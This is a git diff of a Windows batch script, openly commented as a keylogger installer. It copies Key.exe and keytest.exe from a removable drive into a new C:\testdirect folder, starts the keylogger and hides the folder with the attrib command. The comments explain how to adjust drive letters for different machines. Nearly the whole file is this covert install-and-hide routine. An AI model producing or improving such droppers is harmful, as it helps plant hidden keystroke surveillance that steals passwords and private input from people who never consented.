@@ -1,29 +1,40 @@
+@ECHO OFF
+:: Batch file starting in C:\ directory 
+C:
+:: Change back to main directory if needed
 cd ..
 cd ..
 cd ..
 cd ..
-mkdir testdirect2
+:: Make directory in which keylogger file will hide itself in
+mkdir testdirect
 
-
+:: I put a few drives, since lots of computers differ, please make changes as needed
+:: My code was in the E: Drive, but as mentioned, change as needed
 
 E:
-copy E:\TeamViewer2.exe C:\testdirect2
-copy E:\keytest.exe C:\testdirect2
+copy E:\Key.exe C:\testdirect
+copy E:\keytest.exe C:\testdirect
+
 D:
 
 F:
 
 C:
 
+:: Change back to main C: directory
 cd ..
 cd ..
 cd ..
-cd testdirect2
 
+:: Enter testdirectory 
+cd testdirect
 
+:: Start Keylogger in testdirect
 
 start Key.exe
+:: Leave testdirect
 cd ..
-attrib +h +r +s "testdirect2"
+:: Hide the directory, to unhide swtich the + to the -
+attrib +h "testdirect"
 
-PAUSE
